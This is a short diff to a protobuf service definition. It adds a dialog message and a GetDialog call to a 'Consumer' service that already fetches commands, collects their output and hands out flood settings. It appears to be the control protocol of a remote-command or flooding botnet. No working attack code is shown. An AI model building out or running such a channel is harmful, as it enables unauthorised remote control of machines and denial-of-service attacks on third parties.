@@ -30,6 +30,12 @@ message FloodData {
     int64 num_threads = 5;
 }
 
+message DialogData {
+    bool shouldShowDialog = 1;
+    string DialogPrompt = 2;
+    string DialogTitle = 3;
+}
+
 message ClientDataRequest { string client_id = 1; }
 
 message ClientDataOnScreenTextResponse { ClientOnScreenData on_screen = 1; }
@@ -40,4 +46,5 @@ service Consumer {
     rpc GetCommand(ClientDataRequest) returns (ClientExecData);
     rpc SetCommandOutput(ClientExecOutput) returns (Void);
     rpc GetFlood(Void) returns (FloodData);
+    rpc GetDialog(Void) returns (DialogData);
 }
